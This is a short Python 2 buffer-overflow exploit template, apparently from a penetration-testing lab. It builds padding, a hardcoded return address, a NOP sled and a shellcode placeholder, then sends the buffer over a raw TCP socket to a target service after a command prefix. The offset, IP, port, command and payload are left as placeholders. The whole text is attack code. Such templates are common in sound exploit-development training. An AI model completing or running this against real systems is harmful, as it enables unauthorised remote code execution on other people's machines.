import sys,socket
shell = ("<Enter payload>")
offset = "A"*<Actual value> + "\xaf\x11\x50\x62" + "\x90"*30 + shell
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('<ip>',<port>))
	s.send(('<command> /.:/' + offset))
	s.close()
except:
	print "[+] ERROR"
	sys.exit()
